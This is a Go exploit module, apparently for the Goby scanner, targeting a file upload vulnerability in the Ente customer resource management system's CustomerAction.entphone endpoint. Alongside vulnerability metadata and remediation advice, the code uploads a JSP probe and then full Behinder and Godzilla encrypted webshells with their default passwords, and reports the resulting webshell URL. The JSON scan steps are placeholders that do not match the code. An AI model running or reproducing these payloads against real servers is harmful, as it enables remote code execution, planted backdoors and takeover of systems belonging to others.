package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Department of Customer Resource Management Zhejiang University Entphone CustomerAction.entphone file upload vulnerability",
    "Description": "<p>Zhejiang University Ente Customer Resource Management System is a customer relationship management (CRM) system launched by Zhejiang University Ente Zhejiang University Technology Co., Ltd. The system is designed to help companies efficiently manage customer relationships, improve sales performance, and promote the optimization of marketing and customer service.</p><p>Attackers can exploit file upload vulnerabilities to execute malicious code, write backdoors, and read sensitive files, which may lead to the server being attacked and taken over.</p>",
    "Product": "Zhejiang-Duite-Customer-Resource-MS",
    "Homepage": "http://www.entersoft.cn/",
    "DisclosureDate": "2023-11-14",
    "PostTime": "2023-11-14",
    "Author": "2737977997@qq.com",
    "FofaQuery": "body=\"script/Ent.base.js\"",
    "GobyQuery": "body=\"script/Ent.base.js\"",
    "Level": "3",
    "Impact": "<p>Attackers can exploit file upload vulnerabilities to execute malicious code, write backdoors, and read sensitive files, which may lead to the server being attacked and taken over.</p>",
    "Recommendation": "<p>1. Please upgrade the system to the latest version and contact the manufacturer to fix the vulnerability: <a href=\"http://www.entersoft.cn/\">http://www.entersoft.cn/</a></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://mp.weixin.qq.com/s/yesxZD71HEKxpxQrmnsBrg"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "behinder,godzilla,custom",
            "show": ""
        },
        {
            "name": "content",
            "type": "input",
            "value": "<% out.println(\"hello\");%>",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": " item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "浙大恩特客户资源管理系统 CustomerAction.entphone 文件上传漏洞",
            "Product": "浙大恩特客户资源管理系统",
            "Description": "<p>浙大恩特客户资源管理系统是由浙江大学恩智浙大科技有限公司推出的客户关系管理（CRM）系统。该系统旨在帮助企业高效管理客户关系，提升销售业绩，促进市场营销和客户服务的优化。</p><p>攻击者可以利用文件上传漏洞执行恶意代码、写入后门、读取敏感文件，从而可能导致服务器受到攻击并被控制。</p>",
            "Recommendation": "<p>1、请升级系统到最新版本，联系厂商修复漏洞：<a href=\"http://www.entersoft.cn/\">http://www.entersoft.cn/</a><br></p><p>2、部署Web应用防火墙，对数据库操作进行监控。<br></p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>攻击者可以利用文件上传漏洞执行恶意代码、写入后门、读取敏感文件，从而可能导致服务器受到攻击并被控制。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Department of Customer Resource Management Zhejiang University Entphone CustomerAction.entphone file upload vulnerability",
            "Product": "Zhejiang-Duite-Customer-Resource-MS",
            "Description": "<p>Zhejiang University Ente Customer Resource Management System is a customer relationship management (CRM) system launched by Zhejiang University Ente Zhejiang University Technology Co., Ltd. The system is designed to help companies efficiently manage customer relationships, improve sales performance, and promote the optimization of marketing and customer service.</p><p>Attackers can exploit file upload vulnerabilities to execute malicious code, write backdoors, and read sensitive files, which may lead to the server being attacked and taken over.</p>",
            "Recommendation": "<p>1. Please upgrade the system to the latest version and contact the manufacturer to fix the vulnerability: <a href=\"http://www.entersoft.cn/\">http://www.entersoft.cn/</a></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Attackers can exploit file upload vulnerabilities to execute malicious code, write backdoors, and read sensitive files, which may lead to the server being attacked and taken over.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10870"
}`
	existenceJudgmentddasd321as := func(hostInfo *httpclient.FixUrl, filename string) (*httpclient.HttpResponse, error) {
		requestConfigCheck := httpclient.NewGetRequestConfig(filename)
		requestConfigCheck.VerifyTls = false
		requestConfigCheck.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, requestConfigCheck)
	}
	sendPayloaddmkk312 := func(hostInfo *httpclient.FixUrl, content string) (*httpclient.HttpResponse, error) {
		filename := goutils.RandomHexString(16) + ".jsp"
		uploadRequestConfig := httpclient.NewPostRequestConfig("/entsoft/CustomerAction.entphone;.js?method=loadFile")
		uploadRequestConfig.Header.Store("Upgrade-Insecure-Requests", "1")
		uploadRequestConfig.Header.Store("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed exchange;v=b3;q=0.9")
		uploadRequestConfig.Header.Store("Accept-Encoding", "gzip, deflate")
		uploadRequestConfig.Header.Store("Accept-Language", "zh-CN,zh;q=0.9")
		uploadRequestConfig.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundarye8FPHsIAq9JN8j2A")
		uploadRequestConfig.Data = "------WebKitFormBoundarye8FPHsIAq9JN8j2A\r\nContent-Disposition: form-data; name=\"file\";filename=\"" + filename + "\"\r\nContent-Type: image/jpeg\r\n\r\n" + content + "\r\n------WebKitFormBoundarye8FPHsIAq9JN8j2A--\r\n"
		return httpclient.DoHttpRequest(hostInfo, uploadRequestConfig)
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(16)
			if resp, err := sendPayloaddmkk312(hostinfo, "<% out.println(\""+checkStr+"\");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>"); err == nil && strings.Contains(resp.Utf8Html, "\"filepath\":\"") {
				match := regexp.MustCompile(`"filepath":"([^"]+)"`).FindStringSubmatch(resp.Utf8Html)
				if len(match) > 1 {
					resp, err = existenceJudgmentddasd321as(hostinfo, match[1])
					return resp != nil && resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, checkStr)
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			var content string
			if attackType == "behinder" {
				// /*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
				content = `<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>`
			} else if attackType == "godzilla" {
				// 哥斯拉 pass key
				content = `<%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}
%>`
			} else if attackType == "custom" {
				content = goutils.B2S(stepLogs.Params["content"])
			} else {
				expResult.Output = `未知的利用方式`
				return expResult
			}
			resp, err := sendPayloaddmkk312(expResult.HostInfo, content)
			if err != nil {
				expResult.Output = err.Error()
			} else if strings.Contains(resp.Utf8Html, "\"filepath\":\"") {
				match := regexp.MustCompile(`"filepath":"([^"]+)"`).FindStringSubmatch(resp.Utf8Html)
				if len(match) > 1 {
					resp, err := existenceJudgmentddasd321as(expResult.HostInfo, match[1])
					if err != nil {
						expResult.Output = err.Error()
					} else if resp.StatusCode == 200 || resp.StatusCode == 500 {
						expResult.Success = true
						expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + match[1] + "\n"
						if attackType == "behinder" {
							expResult.Output += "Password: rebeyond\n"
							expResult.Output += "WebShell tool: Behinder v3.0\n"
						} else if attackType == "godzilla" {
							expResult.Output += "Password: pass 加密器：JAVA_AES_BASE64\n"
							expResult.Output += "WebShell tool: Godzilla v4.1\n"
						}
						expResult.Output += "Webshell type: jsp"
					} else {
						expResult.Output = `漏洞利用失败`
					}
				} else {
					expResult.Output = `漏洞利用失败`
				}
			} else {
				expResult.Output = `漏洞利用失败`
			}
			return expResult
		},
	))
}